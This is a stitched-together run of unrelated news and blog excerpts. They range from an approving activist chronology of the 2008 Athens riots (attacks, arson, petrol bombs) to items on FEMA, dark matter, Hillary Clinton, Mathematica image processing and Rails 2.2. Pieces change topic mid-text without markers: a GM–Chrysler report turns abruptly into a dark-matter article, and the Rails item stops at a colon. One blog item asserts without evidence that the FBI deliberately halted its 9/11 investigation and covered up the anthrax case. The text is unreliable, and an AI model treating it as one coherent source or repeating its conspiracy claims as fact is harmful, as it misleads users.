At 18.00 a demo was organized in Egaleo , a suburb of Athens by the local anarchist group .
More than 100 people participated in the demo which headed for the police station .
The demonstrators attacked the police station and broke the windows and cameras of all the banks in their way .
At the same place , there was also a demonstration organized by leftist groups which followed another route .
During the day permanent and temp workers , students and unemployed from the occupations of ASOEE and GSEE organized interventions in two call centres : MRB ( which is a company organizing public opinion polls ) and OTE ( which is the national telecommunications company of Greece ) .
The first intervention took place around noon and only a few people participated because of the big distance of the site from the city centre .
In the second intervention around 60 people participated and blocked the work process for a few minutes .
The temp workers in the call centre responded to the action in a positive way .
At this point 800 high schools were under occupation according to the Secondary School Teachers ’ Union ( OLME ) .
Around one hundred people interrupted the premiere of the National Theatre in Athens late in the evening .
They took the stage and held out a banner reading ‘ Everyone to the streets .
Immediate release of all the arrested during the revolt ’ .
The text distributed to the audience and actors read , among other things : ‘ now that you ’ve deactivated your mobile phones , it ’s about time you activated your consciousness ’ .
Saturday , 20th of December
During the day 3 radio stations were occupied .
In the afternoon , demonstrations were organized in many suburbs and neighborhoods of Athens : Gyzi , Peristeri , Halandri , Vironas , Petralona , Nea Smirni .
The demonstrations were organized either by local occupations or by local anti-authoritarian and leftist groups .
This mobilization took place after a call for an international day of action by the occupations of ASOEE and National Technical University of Athens .
Hundreds of people participated in the demonstrations .
Later , a department store in Agios Panteleimonas , a poor neighborhood of Athens where many immigrants live , was looted by a group of militants .
In the evening , the building of Teiresias , an inter - banking company which “ processes data that reflect the economic behavior of individuals and companies ” was attacked and burnt down .
Later , more than a thousand people gathered in the streets around Exarhia square commemorating the murder of Alexandros .
Clashes began with the police forces but the crowd was dispersed and pushed back inside the premises of the National Technical University .
The clashes continued around the National Technical University until early in the morning .
The financial department of the greek police force in Nea Filadelfeia was attacked with petrol bombs .
Apart from damages to the building 7 cars were destroyed .
Sunday , 21st of December
At noon demonstrations took place in Kesariani - Pagrati ( about 250 participants ) and Ilion ( about 100 participants ) .
In Ilion , the demonstrators threw stones and broke the windows of 4 banks and 1 job centre ( OAED ) .
The occupation of GSEE was terminated in the afternoon with a demo that headed for the National Technical University via Patission avenue .
The initial plan for the course of the demo was to pass through nearby proletarian neighborhoods where many immigrants live .
But this was changed since there were rumors that the police would violate the academic asylum and evacuate the National Technical University .
The last meeting in GSEE , which was focused on the issue of solidarity with those insurgents that are imprisoned or under police persecution , decided to organize a demo on Wednesday 24th of December at 16.00 , from Monastiraki square to Syntagma Square through Ermou street which is the most expensive commercial district in Greece .
About a hundred students from drama schools interrupted 15 theatre performances around Athens .
The main slogans of the interventions were the following : “ Insurrectionary new year , everybody to the streets ” , “ It is not possible to kill our dreams ” .
Monday , 22nd of December
The Town Hall of Peristeri was occupied at noon by about 100 people .
A mafia type gang attacked a migrant cleaner , K. Kuneva , 44 , the secretary of the cleaners ’ union , as she was returning home from work late in the evening .
They used sulphuric acid to burn her face .
As a consequence she lost one eye and has been kept in the intensive care ward hospital in critical situation until now suffering serious sight and respiratory system problems .
K. Kuneva , was working at one of ISAP ’s ( the Athens - Piraeus Electric Railway ) subcontracting companies and she said that she was in constant conflict with her bosses and that lately she had been receiving anonymous threatening calls .
Tuesday , 23rd of December
Early in the morning , shots were fired at a riot police bus in Goudi without any injuries .
A group calling itself ‘ Popular Action ’ claimed responsibility for the attack by phoning an online media centre , without leaving a leaflet explaining the reasons why , which is quite unusual as a practice .
This , as well as the place from where the shots came ( an occupied small building used as a meeting place for antiauthoritarian students ) makes the whole case very suspicious .
Shortly after , the Public Prosecutor gave the permission to the police to search the area , thus violating the university asylum .
5,000 people participated in the demo organized by the coordinating committees of the occupied universities and high schools .
Before the demo began some demonstrators flipped over a police car but this action was not followed by further clashes during the demo .
Most of the participants in the occupation of the Law school decided to leave the building .
In Nea Filadelfia 200 people made a demonstration from the occupation of the municipal cultural centre to the local police station .
The demonstrators threw eggs , paint and stones at the police station .
Wednesday , 24th of December
The occupation of ASOEE was terminated in the afternoon .
More than 1,500 people , mainly from the anti-authoritarian milieu , participated in the demonstration which was organized by the meeting that took place in the occupation of GSEE on Sunday in solidarity with the prosecuted insurgents .
The demonstration started from Monastiraki square , passed through Ermou street , reached Syntagma square and then returned to Monastiraki square through Kolokotroni street .
Some youths joined the demo which passed through the most commercial part of the city at a time when Christmas shopping was at its peak .
The slogans of the demo called for a continuation of the insurrection against the Christmas shopping “ spirit ” .
The occupation of the National Technical University was terminated at midnight .
Friday , 26th of December
About 150 people participated in a demo outside Evaggelismos hospital where K. Kuneva is kept .
The slogans called for “ resistance against bosses ’ terrorism ” .
Saturday , 27th of December
At noon , 300 people occupied the headquarters building of ISAP as a first response to the murderous attack on Konstantina Kuneva .
The group that organized this action issued a communiquÈ which can be found in the appendix of the chronology .
At 4 pm an assembly took place which was called in order to organize solidarity actions with those insurgents that were imprisoned or are under prosecution .
It was attended by 500 people .
It was decided that on Sunday people would participate in the actions against the opening of shops .
( In Greece shops are closed on Sunday , but the state tries to force a law against it .
The previous day the government decided to open the shops “ exceptionally ” in the centre of Athens in order to compensate the damage the “ shop - owners ” suffered because of the violence of the insurrection ) .
In the same assembly people also decided to hold a demo outside Korydallos prisons on New Year ’s Eve , at 23:00 , in order to express their solidarity to the imprisoned insurgents .
Sunday , 28th of December
At 9:30 am about 200 people gathered outside a big bookshop on Syntagma square and blocked the entrances .
Some of them were members of the bookshop assistants ’ union , but most of them were workers and students from the previous day ’s solidarity assembly .
A lot of the participants decided that they could block more shops and they marched on Ermou str .
There , they split in groups of 10 to 20 people and they started blocking the entrances of some main shops of Ermou Str. ( like we ’ve said before , one of the most expensive commercial streets of Europe ) .
The slogans shouted were : “ Freedom to those who have to work ” , “ They make us work on Sunday , they shoot us , and we live in a war every day ” .
As time was passing , a mass shopping crowd was flooding Ermou Street and it became somehow difficult to keep on blocking the access .
It was interesting though that the shop bosses seemed to be afraid : they turned off the lights and waited patiently for the demonstrators to leave the place .
Some left - wing people also participated in the blockings which were taking place at the same time in at least 3 other spots of the commercial centre of the city .
500 members of the so called Communist Party marched up and down the street , more interested in giving a media show than actually blocking the shops .
At about 1:30 pm the blockers decided to leave the place marching towards a big bookshop in Exarhia ( about 2 km away ) .
After making the boss close the shop , they left .
Most of them went to the ISAP occupied building to participate in a demo from this building to Evaggelismos hospital where K. Kuneva is kept , thus putting an end to that particular occupation .
Μοnday , 29th of December
At 3 pm , about 120 people gathered on the second floor of the commercial centre named “ THE MALL ATHENS ” – the biggest and most glamorous shopping centre of Attiki region– in Maroussi , a suburb 15 km from the centre of Athens , and made a 30 - minute demo inside the commercial centre .
They were holding two banners , one claiming the immediate liberation of all the arrested insurgents and another one with the motto “ I consume , therefore I am ” .
During the demo , which could be seen by everybody inside the building , some of the demonstrators hung another banner , on which there was written “ work , consume , die ” , while others distributed leaflets to the hundreds of the people inside and outside the stores .
After the demo was over , they occupied the info desk microphones and read their leaflets out .
There were writings on the walls and the slogan “ work , vote and shut up ” was written near the main entrance .
Finally , they left the centre playing football with the balls and ornaments of the Christmas tree just outside the main entrance .
In the afternoon , a demo organized by the solidarity to K. Kuneva assembly marched to the offices of the cleaning company ( the owner of which is an ex-official of PASOK , one of the two major political parties in Greece ) in Piraeus .
They went there in order to protect another female worker from being fired .
However , the boss had closed the offices and cops were outside guarding the place .
The people attacked the police and made them run away , with four police officers taken injured to hospital .
Wednesday , 31st of December
At 23.30 a crowd of approximately 1,000 people gathered outside the prison of Athens which is located at the Korydallos suburb of Athens , demanding the immediate release of the rebels arrested during the uprising of December .
The crowd shouted slogans such as “ Freedom to all prisoners ” , “ The passion for freedom is stronger than all the cells ” , “ Neither common prisoners , nor political prisoners , let all prisons burn ” .
The inmates set blankets and sheets on fire and they waved them through the windows of the cells .
At midnight the gathered crowd lit up fireworks and torches in order to “ welcome ” the coming of a smashing new year .
Then , they marched to the female prison shouting slogans in solidarity with the inmates .
Finally , they marched towards the central square of Korydallos assaulting verbally the police and they dispersed .

Ecopreneurist recently received a question from a reader about whether manufacturing an eco-friendly product in China is a good idea .
We thought his question would make a good topic for discussion and encourage other Ecopreneurist readers to give Chris your advice too by commenting below .
Chris wrote , “ I have designed some great eco-friendly items [ … that … ] are not eco- or green - washed , but [ are ] designed from the start to be green and are made with fully sustainable and recycled materials …
The problem I am having is , the only place I can find a supplier to make these green products is in China .
I am afraid that there could be criticism , backlash or negative comments made about the brand because the products are not made in a more eco-friendly perceived Country .
I have made a huge effort to have the items made elsewhere without any luck …
Do I make the items in China if that is my only option and risk criticism ? ”
[ social_buttons ]
Chris , you are right to see this as an important branding question .
I assume that you have checked into the potential manufacturer and have confidence in that factory ’s environmental record and labor practices .
If you know that it is possible to manufacture a product in China in a sustainable way , then it is just a matter of either transportation or image .
And , for products sold on the West Coast of the US , shipping from China can have less impact on the environment than other transportation means , such as trucking or air freight .
So , let ’s assume that your product will be truly green in all ways ( materials , manufacturing and shipping ) and that your issue is only a matter of impression .
What can you do ?
Transparency
Explain your choice of materials and manufacturing facility on your website and on the packaging .
A lot of consumer education is still needed around green products .
If you know you are operating a green business , but you feel consumers wo n’t “ get it ” , explain your choices .
You ca n’t really prevent people from being prejudiced if they are determined to be so , but you can show that not every person and every factory in China works unsustainably .
Authenticity
Operate all aspects of your green business in a truly sustainable way .
If your choices of office supplies , packaging , marketing materials , commuting transportation , office equipment , etc. are all made with sustainability in mind , you are less likely to be criticized for any aspect of your business operations .
An eco-sensitive consumer who sees waste or hypocrisy , is more likely to assume that major business choices ( such as manufacturing location ) have been made without the level of environmental concern that you are obviously have .
I hope that other Econpreneurist readers and writers will weigh - in with their thoughts on and / or experience with manufacturing in China .

Comedian Rob Riggle is leaving Jon Stewart ’s The Daily Show after a 2 year stint .
Riggle is best know for a short stint on Saturday Night Live , but has entertained viewers on The Daily Show since late 2006 .
Riggle is best known as the ex Army Guy .
Before his career on TV , Riggle was a major in the United States Marine Corps Reserve , and served in Liberia , Kosovo , and Afghanistan .
He is currently a public affairs officer with the New York City Public Affairs unit and is a recipient of the Combat Action Ribbon .
Here ’s the full clip of the announcement :
A former Millbrae teacher who pleaded no contest to secretly filming girls in a school bathroom has been sentenced to two years in prison .
David Lista , 36 , entered the plea in August to two felony counts related to drug and child porn possession , as well as two misdemeanor counts of improper peeping .
The sentence is part of a plea deal that prosecutors say will spare victims from having to testify at trial .
Lista taught English at Mills High School for 10 years .
Authorities arrested Lista in March after the school found images of female students on his computer from pinhole cameras he allegedly installed above bathroom stalls and under classroom desks .
A search of his home also turned up child porn and drugs .

Washington , DC’s Metro system recently enacted a random police search policy for its riders , citing increased security concerns for the decision .
But in reality , the new policy does nothing to protect people from terrorist attacks and pushes people away from public transit and into cars.[social_buttons ]
Which is the bigger threat : a terrorist attack on a train or the greenhouse gases that spew from cars stuck in rush hour traffic ?
The DC Metro stations will place clear signs posted at the stations that riders are subject to search .
In addition , according to the transit authority , riders will have the ability to reject search and opt to leave the premises instead .
Now let ’s think about this .
Would a terrorist willingly open their bag to expose a bomb , or would he or she simply refuse and try again later , in hopes that they are not randomly searched the second time ?
The policy assumes the potential terrorist attack will be so poorly planned that those executing it would n’t bother to check what the policy is on bag searches .
I think we learned from September 11th that terrorists are not stupid and tend to plan ahead .
However , this law will affect everyday riders of public transit in Washington , DC .
The police have specifically said that they will arrest anyone who is found with an illegal item , including marijuana , some knives and pepper sprays , or any other type of contraband .
As civilians are targeted through the program , word could spread and result in decreased public transit ridership .
Flexyourrights.org has published a guide for DC that explains in detail how to politely refuse to be searched .
The only way to avoid it is to leave the station , which many people would not be willing to do because , obviously , they are usually trying to arrive somewhere by a certain time .
According to appellate and Supreme Court rulings in the past , the program is totally legal .
But really , if not for constitutionality reasons , the program should be overturned due to its glaring ineffectiveness .

FEMA trucks dump surplus ice on Seguin landing strip FEMA says ice was no longer needed on Gulf Coast
SEGUIN --
Thousands of pallets of ice , originally dispatched for areas ravaged by Hurricane Ike , melted in the sun today on a runway at Randolph Auxiliary Air Field here , with more trucks lining up to unload more ice .
But it 's not indicative of poor planning by the Federal Emergency Management Agency , a spokesman said .
In fact , it 's just the opposite , evidence that FEMA was well prepared for Ike .
" That ice is surplus ice from the original requests from state , county and local authorities before the scope of the hurricane was known , " said FEMA spokesman Richard Scorza .
" We try to anticipate the needs for various commodities .
The good news is it addressed the immediate needs of the population and there are no shortages . "
Scorza said FEMA officials made aggressive efforts to place the surplus ice with other organizations , from churches to fish markets , but had only two takers , a church in Webster and an organization in Kentucky .
He said the agency decided to unload the ice and let it melt because it would be more expensive to keep it frozen indefinitely to fill some unknown future need .
Scorza did not know how many trucks or how much ice was headed for Seguin , but said if any areas on the coast needed more ice , FEMA could supply it immediately .
" Our indications are that the ice they have on hand is sufficient for their needs , " he said of coastal cities .
" Better to have too much than not enough .
This is a product of prudent planning .
You do n't want to be in a position where you underestimated your need . "
The pallets of ice covered hundreds of square yards , and a continuous line of trucks were arriving at midday to unload more .
FEMA officials and security personnel at the airfield , an annex of San Antonio 's Randolph AFB , refused to allow reporters onto the property , and initially objected to a reporter standing on a public road near the fence to try to interview truckers inside the fence .
When some truckers consented to an interview , a man wearing a FEMA shirt arrived on a golf cart within moments and threatened to have the truckers fired .
" This conversation is over , " he told the truckers .
" Or you guys will not be here any longer . "
A security guard at the gate said the truckers had all signed an agreement not to speak to news media .
One trucker , contacted by phone , agreed to speak if his name was not published .
He said he picked up his 40,000 - pound load of ice in Maryland last Wednesday and arrived in Houston near midnight Saturday , where he sat until he was sent to Seguin today to have the ice unloaded .
He said he was frustrated and upset at the turn of events , estimating the cost of the ice and his trip to be at least $ 12,000 .
He said he had seen at least 125 other trucks at the facility unloading .

DETROIT 
A possible merger of General Motors and Chrysler increasingly appears to hinge on federal aid , according to people with knowledge of the merger talks .
G.M. and Chrysler ’s majority owner , Cerberus Capital Management , are said to be committed to a merger of the two troubled automakers but have yet to line up financing to inject more cash into the companies .
But investors are hesitant to put money into the deal without federal assistance in some form , possibly a direct loan or an equity stake , said people close to the talks who spoke on the condition that they not be named .
One person said Friday that G.M. was pursuing government assistance .
A spokeswoman for the Treasury Department , however , said the rescue package was more focused on financial institutions .
Antimatter is rare in the universe , and so looking for it is a good way of hunting for exotic phenomena like dark matter .
Another indication that something funny is happening on the dark side of the universe is evident in maps of the cosmic background radiation left over from the Big Bang .
Those maps , produced most recently this year by the Wilkinson Microwave Anisotropy Probe satellite , show a haze of what seem to be charged particles hovering around the Milky Way galaxy , according to an analysis by Douglas Finkbeiner of the Harvard - Smithsonian Center for Astrophysics .
Adding to the mix and mystery , the European Space Agency ’s Integral satellite detected gamma rays emanating from the center of the Milky Way , suggesting the presence of positrons there , but with much lower energies than Pamela and Dr. Wefel ’s experiments have seen .
What all this adds up to , or indeed whether it all adds up to anything at all , depends on which observations you trust and your theoretical presumptions about particle physics and the nature of dark matter .
Moreover , efforts to calculate the background level of high - energy particles in the galaxy are beset with messy uncertainties .
“ The dark matter signal is easy to calculate , ” Dr. Kane said .
“ The background is much harder . ”
Dark matter has teased and obsessed astronomers since the 1930s , when the Caltech astronomer Fritz Zwicky deduced that some invisible “ missing mass ” was required to supply the gravitational glue to hold clusters of galaxies together .
The idea became respectable in the 1970s when Vera C. Rubin of the Carnegie Institution of Washington and her collaborators found from studying the motions of stars that most galaxies seemed to be surrounded by halos of dark matter .
The stakes for dark matter go beyond cosmology .
The most favored candidates for its identity come from a theory called supersymmetry , which unifies three of the four known forces of nature mathematically and posits the existence of a realm of as - yet - undiscovered particles .
They would be so - called wimps  weakly interacting massive particles  which feel gravity and little else , and could drift through the Earth like wind through a screen door .
Such particles left over from the Big Bang could form a shadow universe clumping together into dark clouds that then attract ordinary matter .
The discovery of a supersymmetric particle would also be a boost for string theory , the controversial “ theory of everything , ” and would explicate the nature of a quarter of the universe .
But until now , the dark matter particles have mostly eluded direct detection in the laboratory , the exception being a controversial underground experiment called Dama / Libra , for Dark Matter / Large Sodium Iodide Bulk for Rare Processes , under the Italian Alps , where scientists claimed in April to have seen a seasonal effect of a “ dark matter wind ” as the Earth goes around its orbit .

Jonathan Freedland on the pros and cons of Hillary Clinton becoming US secretary of state guardian .co.uk
Hillary Clinton plans to accept the job of secretary of state offered by Barack Obama , who is reaching out to former rivals to build a broad coalition administration , the Guardian has learned .
Obama 's advisers have begun looking into Bill Clinton 's foundation , which distributes millions of dollars to Africa to help with development , to ensure that there is no conflict of interest .
But Democrats do not believe that the vetting is likely to be a problem .
Clinton would be well placed to become the country 's dominant voice in foreign affairs , replacing Condoleezza Rice .
Since being elected senator for New York , she has specialised in foreign affairs and defence .
Although she supported the war in Iraq , she and Obama basically agree on a withdrawal of American troops .
Clinton , who still harbours hopes of a future presidential run , had to weigh up whether she would be better placed by staying in the Senate , which offers a platform for life , or making the more uncertain career move to the secretary of state job .
As part of the coalition - building , Obama today also reached out to his defeated Republican rival , John McCain , to discuss how they could work together to roll back some of the most controversial policies of the Bush years .
Putting aside the bitter words thrown about with abandon by both sides during the election campaign , McCain flew to meet Obama at his headquarters in the Kluczynski Federal Building , in downtown Chicago .
Obama , speaking before the meeting , said : " We 're going to have a good conversation about how we can do some work together to fix up the country . "
He said he also wanted to thank McCain for his service to the country .
Asked by a reporter whether he would work with Obama , McCain , who has long favoured a bipartisan approach to politics , replied : " Obviously " .
Sources on both sides said Obama did not offer McCain a cabinet job , but focused on how the senator for Arizona could help to guide through Congress legislation that they both strongly favour .
Given Obama 's status as president - in - waiting , the two met in a formal setting , a room decked out with a US flag , and were accompanied by senior advisers .
Obama appeared the more relaxed of the two , sitting with legs crossed , smiling broadly and waving to reporters , while McCain sat stiffly , with a seemingly fixed grin .
Although the two clashed during the election campaign over tax policy and withdrawal from Iraq , they have more in common than they have differences .
They both favour the closure of the Guantánamo Bay detention centre , an increase in US troops to Afghanistan , immigration reform , stem cell research and measures to tackle climate change , and oppose torture and the widespread use of wire - tapping .
Although Democrats made gains in the Senate in the November 4 elections , they fell short of the 60 seats that would have allowed them to override Republican blocking tactics and will need Republican allies to get Obama 's plans through .
This was highlighted today when the Democratic leadership in Congress announced that a broad economic stimulus package Obama sought was not likely to be passed because of Republican opposition .
Obama confirmed at the weekend that he would offer jobs to some Republicans .
One of the names that crops up most often is Chuck Hagel , the former Republican senator who is a specialist in foreign affairs and a critic of the Iraq war .

The FBI ties up loose ends

After seven years of destroying evidence and intimidating witnesses , the FBI has finally " caught " the individual responsible for the 2001 anthrax attacks .
Or so they say .
Bruce Ivins may or may not have been involved in the anthrax attacks .
Now that he 's dead , we 'll never know because it will be " case closed . "
What we do know for sure is that the anthrax attacks , right on the heels of 9/11 : 1 ) terrorized Congress and 2 ) gave Bush / Cheney a reason to stop the FBI investigation of the 9/11 attacks .
That 's right ... The FBI stopped the 9/11 investigation before it even got started .
Look it up .
The FBI STOPPED its 9/11 investigation just weeks after 9/11 and " focused " all of its resources on finding the source of the anthrax attacks .
Seven years later , their heroic efforts have finally born some fruit .
A lone gunman .
Dead by his own hand .
With the noble G - Men hot on his sinister trail .
Cased closed .
Move along .
There 's nothing to see here folks .
UPDATE : Since we posted this , Mr. Spertzel , a member of the biological - weapons section of Unscom from 1994 - 99 and member of the Iraq Survey Group posted this deep in the back pages of the Wall Street Journal :
" We should all remember that the case ( against Ivins ) needs to be firmly based on solid information that would conclusively prove that a lone scientist could make such a sophisticated product .
The multiple disciplines and technologies required to make the anthrax in this case do not exist at Army 's Medical Research Institute of Infectious Diseases ( where Ivins worked . )

If you were hoping to hit a comics shop today to pick up the latest issue of Frank Miller and Jim Lee ’s All Star Batman and Robin the Boy Wonder series ( # 10 ) , you ’re in for a disappointment :
Due to an unfortunate printing mistake that left all the comic book ’s censored profanities visible through black bars , DC Comics has ordered a recall of the entire run .
Though previous issues of the series have included the same trick — bits of lettering stick out from behind the bars , giving the reader a hint of what is actually being said — the tactic backfired this time around due to some unforeseen production problem .
The hilarious result ?
A comic book in which the c-word is dropped several times , and exclamations such as “ This here arcade belongs to the fucking Batgirl ! ” are completely legible .

Since the comic was shipped out to stores across the country , the issues are in circulation despite DC ’s recall , meaning that the offending pages have turned up online , and unreturned copies will no doubt be sold at a premium as collector ’s items in shops and online auctions .
So , you know , if you ’re in the market for a comic that leaves absolutely nothing to the imagination in terms of cartoon profanity , you ’d better start haggling with your local comics retailer — just watch your language !

A detailed analysis of black carbon -- the residue of burned organic matter -- in computer climate models suggests that those models may be overestimating climate change predictions .
A new Cornell study , published online in Nature Geosciences , quantified the amount of black carbon in Australian soils and found that there was far more than expected , said Johannes Lehmann , the paper 's lead author and a Cornell professor of biogeochemistry .
The survey was the largest of black carbon ever published .
As a result of global warming , soils are expected to release more carbon dioxide , the major greenhouse gas , into the atmosphere , which , in turn , creates more warming .
Climate models try to incorporate these increases of carbon dioxide from soils as the planet warms , but results vary greatly when realistic estimates of black carbon in soils are included in the predictions , the study found .
Soils include many forms of carbon , including organic carbon from leaf litter and vegetation and black carbon from the burning of organic matter .
It takes a few years for organic carbon to decompose , as microbes eat it and convert it to carbon dioxide .
But black carbon can take 1,000 - 2,000 years , on average , to convert to carbon dioxide .
By entering realistic estimates of stocks of black carbon in soil from two Australian savannas into a computer model that calculates carbon dioxide release from soil , the researchers found that carbon dioxide emissions from soils were reduced by about 20 percent over 100 years , as compared with simulations that did not take black carbon 's long shelf life into account .
The findings are significant because soils are by far the world 's largest source of carbon dioxide , producing 10 times more carbon dioxide each year than all the carbon dioxide emissions from human activities combined .
Small changes in how carbon emissions from soils are estimated , therefore , can have a large impact .
" We know from measurements that climate change today is worse than people have predicted , " said Lehmann .
" But this particular aspect , black carbon 's stability in soil , if incorporated in climate models , would actually decrease climate predictions . "
The study quantified the amount of black carbon in 452 Australian soils across two savannas .
Black carbon content varied widely , between zero and more than 80 percent , in soils across Australia .
" It 's a mistake to look at soil as one blob of carbon , " said Lehmann .
" Rather , it has different chemical components with different characteristics .
In this way , soil will interact differently to warming based on what 's in it . "
It ’s been possible since Version 6 of Mathematica to embed images directly into lines of code , allowing such stupid code tricks as expanding a polynomial of plots .
But is this really good for anything ?
As with many extremely nifty technologies , this feature of Mathematica had to wait a while before the killer app for it was discovered .
And that killer app is image processing .
Mathematica 7 adds a suite of image processing functions from trivial to highly sophisticated .
To apply them to images , you do n’t need to use any form of import command or file name references .
Just type the command you want to use , then drag and drop the image from your desktop or browser right into the input line .
Here ’s an undersaturated mandrill , and a command to increase the contrast .
When you surround an image with textual input the image is automatically displayed at an icon size , but the input line still contains the full data of the image .
That means if you save the notebook containing the input , the image is saved with it : the input line is completely self - contained .
Is that too much contrast ?
An obvious thing to want is a slider that lets you adjust the contrast .
The general - purpose Manipulate command lets you make just about anything interactive , including the contrast parameter in this example .
OK , but you could just do that in Photoshop , right ?
Oh shush , let ’s do something you definitely can’t .
Here ’s a clown fish , and a command that breaks it into 40 - pixel squares .
By the way , we ’re seeing another neat thing about the integration of images with Mathematica ’s typeset input / output system .
This result is n’t an image , it ’s a list of images .
Lists are general things in Mathematica , and lists of images are no exception .
For example , here are the image patches in reverse order .
And here they are sorted by average pixel value ( roughly by brightness ) :
And here are the images sorted into a scatter plot where the x axis represents the red component , the y axis represents the green component , and the size represents the blue component .
( Image processing commands are fully integrated and compatible with charting commands .
This is , after all , Mathematica , where one comes to expect things to work with each other . )
See how all the green patches are smooth and all the red patches are high - contrast ?
It might be interesting to look at these patches in a similarity network rather than a scatter plot .
Here ’s some code to do that .
This function identifies patches that are similar in color , then connects them into a network .
The parameter says how many neighbors to look at before building the network .
Remember how we made a Manipulate to play with the contrast of an image ?
How about a Manipulate to play with the number of neighbors ?
So there you go : an interactive slider you absolutely cannot get in Photoshop , or anywhere else for that matter .
Let ’s look at another application , edge detection .
Here ’s a very pretty picture taken by Peter Overmann , who led image processing development in Mathematica :
Here ’s what they look like processed through three image processing functions :
LaplacianFilter applies a form of edge detection , ImageAdjust tweaks the brightness and contrast , and then Dilation expands the bright areas to emphasize them .
The end result is neon jellyfish !
One of the main advantages of doing something like this in Mathematica is that you can trivially replicate operations for many images .
Sure , you can write Photoshop scripts ; I ’ve done that many times , and every time I end up swearing at the thing wishing I could use a real language ( and now that Mathematica 7 is out , I finally can ) .
Beyond a certain level of complexity it ’s simply not efficient to mess around with dialog boxes and script editors : you want a real language with a real syntax and a real API .
A simple example : let ’s apply this image processing chain not to one image , but to a series of them .
Just to show off , I ’ll download those images directly from the web using programmatically constructed URLs .
Here ’s a command that constructs ten simple URLs for images from one of my personal websites and imports them all into Mathematica .
And now let ’s apply the same processing to all ten of those images .
Well that ’s not ideal .
Let ’s make a custom interactive application with a slider that lets us play with the Laplacian filter radius and the dilation parameters :
Every time you move a slider , it ’s reprocessing ten images automatically .
Now that ’s integration , real power that comes from taking core functionality and combining it with powerful , general - purpose tools like Manipulate and symbolic processing .
Not to belabor the point , but this is really a fundamental advantage of Mathematica over any other system out there .
Of course the ultimate example of wanting to apply image processing to many images is video processing .
To the goose footage !
Here ’s a frame from a video I want to process ( click the image to see the whole video ) :
What I want to do is draw a blue line around each goose .
Why ?
Do n’t ask , it ’s a demo , OK ?
The function I need for this is MorphologicalComponents , which identifies objects in an image .
To turn this into a blue outline I apply a series of image processing steps .
First I expand the dark area :
Then I take the perimeter ( outline ) of the areas :
Then thicken the outline :
Then turn the outline into a semi- transparent blue :
And finally composite this outline onto the original image :
There you go , blue - outlined geese !
Now I just need to do it for the other 424 frames in the movie .
The movie is easily split into separate frames using QuickTime Pro .
I put all the frames into a directory called “ GeeseIn ” in the same directory as this notebook .
First I count the number of frames :
This command loads one frame of the movie :
The frames load pretty fast , so I can make a perfectly usable little movie viewer just using Manipulate .
Put into animation mode and adjusted to the right speed this actually plays the movie quite smoothly , despite the fact that it ’s reimporting each frame from disk at every step .
To process the movie automatically I put all the image processing steps together into one function :
This function is fast enough that I can make another little viewer that lets me flip through the processed movie in pretty close to real time :
To output a full movie I need to convert and save all the frames .
This function writes one frame out to a directory :
And this Do command processes all the frames :
Finally , it ’s a simple matter to assemble the movie using QuickTime Pro , resulting in this final product :
This is of course just the tip of the iceberg .
For example , I ’m not using the fact that MorphologicalComponents actually separately identifies and numbers each object in the image .
It returns an image where each pixel is assigned the index number of the object occupying it .
In other words , I can color each goose differently !
This constructs a table of different colors for each object index number , and black for the background .
This command identifies the objects , then colors each one according to the given rules .
And this command processes all the frames .
The mod ( or is that rad ? ) result is this movie :
The flickering of colors , well , that ’s because the index numbering of the objects changes from one frame to the next .
Avoiding that , in effect doing persistent object detection across multiple frames , is a whole other can of worms , and beyond the scope of this blog post .
Though if you were wanting to develop such an algorithm , Mathematica might not be a bad place to start .
After two release candidates in the last few weeks , Rails 2.2 has finally been released .
Although the version number does n't indicate a huge step , there are a lot of new features in Rails .
Internationalization
A long anticipated issue finally resolved — Rails now offers a framework for internationalization tasks .
Mind that this does n't mean that Rails now supports any other locale than en-US out of the box , it just makes it easier to hook other internationalization implementations into Rails .
Sven Fuchs explains the goals and motivation of Rails ' internationalization support in his blog :
The first part is the API itself which is just a Ruby module with a bunch of methods that will be used by Rails and delegate all requests to a backend .
The second part is the Simple backend which implements whatever is necessary to re-localize Rails back to en-US .
If you would rather see a quick example , have a look at Trevor Turk 's simple localization blog .
Thread Safety
With version 2.2 , Rails is finally thread - safe , thanks to Josh Peek 's Google Summer of Code project .
With this step also comes the necessity of connection pools .
But what does thread safety actually mean for Rails ?
From the release notes :
Depending on your web server infrastructure , this means you can handle more requests with fewer copies of Rails in memory , leading to better server performance and higher utilization of multiple cores .
JRuby 's Charles Nutter also wrote a detailed blog entry answering that question : " it means removing the single coarse - grained lock around every incoming request and replacing it with finer - grained locks around only those resources that need to be shared across threads " .
Improved Documentation
The internal documentation of Rails has been improved at many places , and there 's also the Ruby on Rails guides site with many extensive and profound articles on topics such as security , testing , debugging .
Other changes include the new mailer layouts , or comfortable memoization to make your code more readable .
Another new feature is the simpler conditional get support , which we already covered in a recent Rails roundup on ETags .
Some last minute changes were done in RC2 , namely the improvement of the request forgery protection and tuning of the ActiveRecord connection pooling code .
Upgrading
There are a lot more changes than what we 've presented here , you can find a more comprehensive list in the Rails 2.2 release notes .
Rails 2.2 depends on very recent Ruby Gems 1.3.1 installation .
If you are having trouble with the update of Ruby Gems , take a look at Eric Hodel 's blog for details .
Afterwards , you should be all set to install Rails :
Netflix is now going to be offering streaming video from the Starz network .
There will be more than 2500 movies and TV shows that subscribers of Netflix will have access to .
Starz , the premium cable television service , plan to announce a deal on Wednesday that will make films aired on Starz available to Netflix subscribers for online viewing at no additional charge .
Netflix ’s “ Watch Instantly ” feature has had more potential than watchable movies .
The service lets subscribers stream any of 12,000 movies and TV shows on their Windows computers , instead of waiting for the DVD to arrive in the mail in the familiar red envelope .
By Brad Stone of the New York Times
But Hollywood staggers the release of its movies — selling DVDs before those same movies are available on pay - per-view , for example .
It does n’t provide a window of exclusivity for subscription video on demand services like Netflix ’s , so the films available there have tended toward the likes of “ Sinbad : Son of a Preacher Man ” and “ Blood Rayne 2 : Deliverance . ”
But now those overlooked gems will be joined by some more popular fare , like “ Spider - Man 3 , ” “ No Country for Old Men ” and “ Superbad . ”
The 16 - year - old Starz , a division of Liberty Media Group , has pay TV deals with two major movie studios , Walt Disney Studios and Sony Pictures .
Starz will bring 2,500 movies and TV shows to Netflix.com , through its Starz Play broadband movie service .
Yesterday 's release of Twilight made certain that your weekend will be filled with the sound of screaming tweeny fangirl hordes , an auditory experience that the movie 's lead actor Robert Pattinson described as " terrifying ... like the sound you hear at the gates of hell . "
It would be easy to hate these creepy , utterly mediocre books and the phenomenon they 've spawned — but I think you 'll find it 's even easier just to throw your head back and laugh .
Next to the fangirl hordes are even bigger crowds of " lolfans , " and they are here to remind us that Twilight has truly given us the greatest gift of all : oodles and oodles of hilarious , sardonic ass - kickery from people on the internet .
